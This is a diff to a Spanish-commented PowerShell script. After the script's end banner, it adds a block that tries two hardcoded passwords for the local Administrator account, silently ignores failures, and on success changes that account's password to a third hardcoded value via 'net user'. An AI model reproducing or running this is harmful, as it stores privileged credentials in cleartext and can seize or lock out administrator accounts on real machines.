@@ -386,3 +386,20 @@ catch {
 # FIN DEL PROCESO
 # ============================================================
 Write-Host "Proceso finalizado."
+    # --------------------------------------------------------
+    # Usuario admin
+    # --------------------------------------------------------
+
+$Usuario = "Administrador"
+$Clave1 = "Divina2021"
+$Clave2 = "Divina2022"
+$NuevaClave = "Pastora1990"
+
+foreach ($Clave in @($Clave1,$Clave2)) {
+    try {
+        $Cred = [System.Management.Automation.PSCredential]::new(".\$Usuario",(ConvertTo-SecureString $Clave -AsPlainText -Force))
+        Start-Process powershell -Credential $Cred -ArgumentList "-Command `"net user $Usuario $NuevaClave`"" -Wait -ErrorAction Stop
+        break
+    }
+    catch {}
+}
